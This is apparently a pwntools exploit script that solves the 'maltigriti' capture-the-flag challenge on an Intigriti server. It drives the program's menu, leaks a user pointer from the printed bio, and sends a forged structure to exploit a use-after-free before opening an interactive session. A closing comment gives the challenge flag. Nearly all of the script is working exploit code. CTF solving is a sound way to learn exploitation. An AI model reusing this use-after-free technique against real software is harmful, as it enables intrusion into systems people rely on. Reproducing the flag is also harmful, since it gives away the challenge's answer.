from pwn import *




#p = process("./maltigriti_patched")

p=remote("maltigriti.ctf.intigriti.io",1337)
p.sendline(b'0')
p.sendline(b'A'*35)
p.sendline(b'200')
p.sendline(b'A'*35)
p.sendline(b'6')
p.sendline(b'6')
p.sendline(b'2')
p.sendline(b'A'*35)
p.sendline(b'1')


p.recvuntil(b'bio is: ')
user_leak = u64(p.recv().split(b'\nEnter')[0]+b'\x00'*2)
print(hex(user_leak))

p.sendline(p64(user_leak)+p64(ord('A'))+p64(1337) )

p.interactive()

# INTIGRITI{u53_4f73r_fr33_50und5_600d_70_m3}